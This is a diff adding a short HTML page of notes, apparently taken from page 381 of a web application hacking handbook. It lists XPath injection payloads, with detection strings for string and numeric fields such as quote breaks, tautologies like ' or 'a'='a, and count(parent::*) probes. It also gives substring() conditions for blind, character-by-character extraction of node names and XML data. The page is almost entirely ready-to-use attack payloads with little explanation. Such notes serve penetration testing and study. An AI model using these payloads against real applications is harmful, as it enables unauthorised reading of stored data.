@@ -1,0 +1,38 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body>WAHH p.381<br/>
+<br/>
+<b><span style="font-size: 12pt">DETECTION</span></b><br/>
+<tt><br/>
+'<br/>
+'--<br/>
+' or 'a'='a<br/>
+' and 'a'='b<br/>
+</tt><tt>or 1=1 and 1=2</tt><br/>
+<br/>
+For string values<br/>
+<tt>' or count(parent::*[position()=1])=0 or 'a'='b<br/>
+</tt><tt>' or count(parent::*[position()=1])&gt;0 or 'a'='b</tt><br/>
+<br/>
+For numeric values<br/>
+<tt>1 or count(parent::*[position()=1])=0<br/>
+</tt><tt>1 or count(parent::*[position()=1])&gt;0</tt><br/>
+<br/>
+<b><span style="font-size: 12pt">EXTRACTION</span></b><br/>
+<br/>
+Use a series of conditions with the following form to determine the name of the current node’s parent <tt>substring(name(parent::*[position()=1]),1,1)='a'<br/>
+</tt><tt>substring(name(parent::*[position()=1]),1,1)='b'<br/>
+.<br/>
+.<br/>
+.<br/>
+<br/>
+</tt>Having extracted the name of the parent node, use a series of conditions with the following form to extract all the data within the XML tree<tt><br/>
+</tt><tt>substring(//parentnodename[position()=1]/child::node() [position()=1]/text(),1,1)='a'<br/>
+substring(//parentnodename[position()=1]/child::node() [position()=1]/text(),1,1)='b'<br/>
+.<br/>
+.<br/>
+.<br/>
+<br/>
+</tt></body></html>
